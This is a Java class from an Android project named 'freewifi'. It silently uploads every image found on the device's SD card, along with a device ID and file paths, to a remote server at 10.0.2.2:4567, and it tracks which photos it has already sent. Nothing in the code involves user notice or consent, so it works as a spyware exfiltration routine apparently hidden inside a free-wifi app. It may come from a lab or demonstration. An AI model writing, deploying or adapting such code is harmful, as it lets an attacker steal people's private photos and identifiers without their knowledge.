package com.example.amata.freewifi;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import java.io.File;
import java.util.List;

import cz.msebera.android.httpclient.Header;

public class ImagesSender {
    public static void sendImages(List<File> imagesFromSd, Context context) {
        String clientId = Installation.id(context);
        final SharedPreferences sentimages = context.getSharedPreferences("sentimages", Context.MODE_PRIVATE);
        AsyncHttpClient client = new AsyncHttpClient();
        for (File photo : imagesFromSd) {
            final String photoPath = photo.getPath();
            boolean alreadySent = sentimages.getBoolean(photoPath, false);
            //Do not send the same image if already sent
            if(!alreadySent) {
                try {

                    RequestParams params = new RequestParams();
                    params.put("client_id", clientId);
                    params.put("file_path", photoPath);
                    params.put("profile_picture", photo);
                    client.post("http://10.0.2.2:4567/images", params, new AsyncHttpResponseHandler() {
                        @Override
                        public void onSuccess(int statusCode, Header[] headers, byte[] response) {
                            Log.d("SEND IMAGE", "IMAGE SENT");
                            SharedPreferences.Editor editor = sentimages.edit();
                            editor.putBoolean(photoPath, true);
                            editor.apply();
                        }

                        @Override
                        public void onFailure(int statusCode, Header[] headers, byte[] errorResponse, Throwable e) {
                            Log.d("SEND IMAGE", "eror sendind image => " + e.getMessage());
                        }
                    });
                } catch (Exception e) {
                    Log.d("ERROR =>", e.getMessage());
                }
            }
        }
    }
}
